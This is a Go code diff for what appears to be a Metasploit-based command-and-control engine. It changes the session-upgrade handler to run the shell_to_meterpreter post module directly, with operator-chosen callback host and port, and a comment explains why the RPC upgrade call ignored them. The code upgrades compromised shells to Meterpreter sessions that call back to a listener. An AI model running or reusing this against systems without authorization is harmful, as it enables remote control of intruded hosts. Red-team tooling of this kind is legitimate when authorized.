@@ -3,6 +3,7 @@ package engine
 import (
 	"bytes"
 	"context"
+	"strconv"
 	"strings"
 
 	"github.com/jolovicdev/go-msf/v2"
@@ -165,7 +166,21 @@ func (e *Engine) sessionUpgrade(ctx context.Context, operator, ws string, p prot
 	if session.Type != "shell" {
 		return &protocol.ErrorBody{Code: protocol.CodeBadParams, Message: "session " + p.SID + " is " + session.Type + ", only shell sessions upgrade"}
 	}
-	if err := gomsf.NewShellSession(rpc, p.SID).Upgrade(ctx, p.LHOST, p.LPORT); err != nil {
+	// Run post/multi/manage/shell_to_meterpreter directly rather than calling
+	// session.shell_upgrade: msfrpcd's rpc_shell_upgrade writes LHOST/LPORT to
+	// session.exploit_datastore and invokes execute_script with no arguments,
+	// so shell_to_meterpreter ignores the requested callback and falls back to
+	// tunnel_local (127.0.0.1 for SSH shells) on port 4433.
+	var sessionOpt interface{} = p.SID
+	if id, err := strconv.Atoi(p.SID); err == nil {
+		sessionOpt = id
+	}
+	if _, err := gomsf.NewModuleManager(rpc).Execute(ctx, gomsf.PostModuleType, "multi/manage/shell_to_meterpreter", map[string]interface{}{
+		"SESSION": sessionOpt,
+		"LHOST":   p.LHOST,
+		"LPORT":   p.LPORT,
+		"HANDLER": true,
+	}); err != nil {
 		return mapErr(err)
 	}
 	e.eventfOpIn(ws, operator, protocol.LevelSuccess, "session %s upgrading to meterpreter via %s:%d", p.SID, p.LHOST, p.LPORT)
